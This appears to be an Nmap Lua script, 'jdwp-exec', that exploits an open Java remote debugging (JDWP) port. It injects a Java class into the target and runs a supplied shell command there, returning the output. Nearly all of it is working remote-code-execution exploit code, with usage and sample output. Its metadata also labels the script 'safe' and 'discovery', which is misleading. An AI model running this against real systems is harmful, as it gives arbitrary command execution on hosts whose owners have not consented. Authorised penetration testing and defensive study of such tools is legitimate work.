local bin = require "bin"
local io = require "io"
local jdwp = require "jdwp"
local stdnse = require "stdnse"
local nmap = require "nmap"
local shortport = require "shortport"
local string = require "string"

description = [[
Script to exploit java's remote debugging port. 

When remote debugging port is left open, it is possible to inject 
java bytecode and achieve remote code execution.

Script abuses this to inject and execute Java class file that 
executes the supplied shell command and returns its output.

The script injects the JDWPSystemInfo class from 
nselib/jdwp-class/ and executes its run() method which 
accepts a shell command as its argument.

]]

author = "Aleksandar Nikolic" 
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"safe","discovery"}

---
-- @usage nmap -sT <target> -p <port> --script=+jdwp-exec --script-args cmd="date"
--
-- @args cmd 	Command to execute on the remote system.
--
-- @output 
-- PORT     STATE SERVICE REASON
-- 2010/tcp open  search  syn-ack
-- | jdwp-exec:
-- |   date output:
-- |   Sat Aug 11 15:27:21 Central European Daylight Time 2012
-- |_

portrule = function(host, port)
        -- JDWP will close the port if there is no valid handshake within 2
	-- seconds, Service detection's NULL probe detects it as tcpwrapped.
        return port.service == "tcpwrapped"
               and port.protocol == "tcp" and port.state == "open"
               and not(shortport.port_is_excluded(port.number,port.protocol))
end

action = function(host, port)
	stdnse.sleep(5) -- let the remote socket recover from connect() scan
	local status,socket = jdwp.connect(host,port) -- initialize the connection
	if not status then
		stdnse.print_debug("error, %s",socket)
	end

	-- read .class file 
	local file = io.open(nmap.fetchfile("nselib/data/jdwp-class/JDWPExecCmd.class"), "rb")
	local class_bytes = file:read("*all")
	
	-- inject the class
	local injectedClass
	status,injectedClass = jdwp.injectClass(socket,class_bytes)
	-- find injected class method
	local runMethodID = jdwp.findMethod(socket,injectedClass.id,"run",false)
	
	if runMethodID == nil then
		stdnse.print_debug("Couldn't find run method.")
		return false
	end	
	-- set run() method argument 
	local cmd = stdnse.get_script_args(SCRIPT_NAME .. '.cmd')
	if cmd == nil then 
		stdnse.print_debug("This script requires a cmd argument to be specified.")
		return false
	end
	local cmdID
	status,cmdID = jdwp.createString(socket,0,cmd)
	local runArgs = bin.pack(">CL",0x4c,cmdID)	-- 0x4c is object type tag
	-- invoke run method
	local result 	
	status, result = jdwp.invokeObjectMethod(socket,0,injectedClass.instance,injectedClass.thread,injectedClass.id,runMethodID,1,runArgs) 
	-- get the result string
	local _,_,stringID = bin.unpack(">CL",result)
	status,result = jdwp.readString(socket,0,stringID)	
	return stdnse.format_output(true,result)	
end

